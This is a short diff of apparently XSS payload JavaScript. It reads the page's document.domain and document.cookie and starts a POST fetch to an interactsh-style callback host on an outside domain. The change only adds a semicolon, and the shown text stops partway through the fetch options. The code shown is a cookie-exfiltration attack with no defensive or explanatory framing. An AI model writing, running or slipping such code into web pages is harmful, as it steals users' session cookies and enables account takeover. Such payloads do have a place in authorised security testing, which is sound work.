@@ -5,7 +5,7 @@ console.log(document.domain);
 
 let data = document.cookie;
 
-const interactsh = "https://daon64cp92lm19hhpil0tmj3nzybngm7s.desert-rat.net"
+const interactsh = "https://daon64cp92lm19hhpil0tmj3nzybngm7s.desert-rat.net";
 
 fetch(interactsh, {
   method: "POST",
